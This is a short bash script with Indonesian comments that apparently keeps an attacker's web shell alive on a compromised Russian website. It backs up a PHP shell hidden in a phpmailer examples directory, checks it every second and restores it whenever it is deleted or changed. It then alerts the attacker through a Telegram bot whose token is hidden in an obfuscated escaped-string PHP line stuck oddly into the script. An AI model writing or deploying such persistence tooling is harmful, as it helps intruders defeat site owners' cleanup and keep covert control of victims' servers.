#!/bin/bash

# Definisikan lokasi file index.php Permissions 755
INDEX_FILE="/var/www/u0453969/data/www/autoprogress-m.ru/includes/phpmailer/examples/scripts/shCoreExp.php" #<<<file directory name.php
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/var/www/u0453969/data/www/autoprogress-m.ru/includes/phpmailer/examples/" #<<<folder directory backup
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/code" #<<<Name file backup

# send notic Telegram
<?php
echo "\x54\117\x4b\105\x4e\75\42\x37\x35\x38\x38\66\61\63\62\x39\65\x3a\101\101\x48\116\163\x5f\111\117\106\165\x4c\171\x5f\x77\145\x75\117\157\x4b\x4d\x50\x57\x61\x47\x6f\x62\x50\x4d\166\164\172\x35\155\160\x34\x22\15\12\103\110\x41\124\x5f\x49\104\x3d\42\x37\x32\63\x34\70\x31\61\x32\x35\71\42";

# Fungsi untuk mengirim notifikasi ke Telegram
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message"
}

# Backup file index.php jika belum ada backup
if [ ! -f "$BACKUP_FILE" ]; then
    cp "$INDEX_FILE" "$BACKUP_FILE"
    echo "Backup pertama dibuat: $BACKUP_FILE"
    send_telegram_notification "Backup pertama dibuat: $BACKUP_FILE"
fi

# Fungsi untuk memonitor perubahan pada file index.php
monitor_file() {
    while true; do
        # Hitung checksum file index.php untuk mendeteksi perubahan
        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')

        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            # Jika checksum berbeda, kembalikan file index.php dari backup
            echo "Change, mengembalikan backup..."
            cp "$BACKUP_FILE" "$INDEX_FILE"
            echo "https://autoprogress-m.ru/includes/phpmailer/examples/scripts/shCoreExp.php" #<<<url shell login
            send_telegram_notification "shell di hapus. SUDAH DI KEMBALIKAN." #<<<Shell di hapus nama file shell #<<< notic dikembalikan
        fi

        # Tunggu 1 detik sebelum pengecekan selanjutnya
        sleep 1
    done
}

#fungsi monitoring
monitor_file
